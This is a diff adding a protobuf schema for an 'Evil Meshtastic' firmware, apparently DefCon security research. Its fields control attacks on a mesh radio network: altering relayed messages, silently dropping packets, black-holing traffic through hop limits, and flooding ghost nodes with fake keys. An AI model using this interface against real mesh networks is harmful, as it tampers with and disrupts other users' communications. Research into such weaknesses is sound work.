@@ -1,0 +1,67 @@
+syntax = "proto3";
+
+package meshtastic;
+
+option java_package = "org.meshtastic.proto";
+option java_outer_classname = "EvilControlProtos";
+
+/*
+ * EvilCtrlMsg — Runtime control message for the evil-node firmware.
+ *
+ * Sent as a PRIVATE_APP (portnum 256) packet addressed to the local node.
+ * The firmware's EvilCtrlModule processes it locally without radio TX.
+ *
+ * Project: Evil Meshtastic — DefCon 2026 HRV security research
+ */
+message EvilCtrlMsg {
+    /*
+     * Message transform mode applied to all relayed text messages in transit.
+     * 0 = NONE (passthrough)
+     * 1 = ROT13 (case-preserving letter rotation)
+     * 2 = REVERSE (byte reversal)
+     * 3 = SUFFIX (append custom string)
+     */
+    uint32 transform = 1;
+
+    /* Custom suffix appended to messages when transform=3. Max 64 bytes. */
+    string suffix = 2;
+
+    /* Random packet drop rate: 0–100 (percent of relay packets to silently drop). 0 = disabled. */
+    uint32 drop_rate = 3;
+
+    /* Drop all packets from a specific node ID. 0 = disabled. */
+    uint32 drop_node = 4;
+
+    /* Drop all packets on a specific channel index. 255 = disabled. */
+    uint32 drop_channel = 5;
+
+    /*
+     * Hop limit override mode for relayed packets.
+     * 0 = NORMAL (honour sender's hop_limit)
+     * 1 = MAX    (force hop_limit=7 — amplify range)
+     * 2 = KILL   (force hop_limit=0 — black hole after one more relay)
+     */
+    uint32 hop_mode = 6;
+
+    /* Trigger a NodeInfo flood when true. */
+    bool flood = 7;
+
+    /* Number of ghost nodes to inject (1–200). Only used when flood=true. */
+    uint32 flood_count = 8;
+
+    /* Include fake 32-byte public keys in ghost NodeInfo packets. */
+    bool flood_keys = 9;
+
+    /* If true, reply with the current EvilCtrlMsg state (for status queries). */
+    bool get_status = 10;
+
+    /*
+     * 32-bit operator authentication token. Must match the token generated on
+     * first boot (stored in NVS). Packets with a missing or wrong token are
+     * silently rejected. Wire type: FIXED64 (8 bytes, zero-extended from 32-bit).
+     */
+    fixed64 token = 11;
+
+    /* Set by the firmware in status reply packets. */
+    bool is_reply = 12;
+}
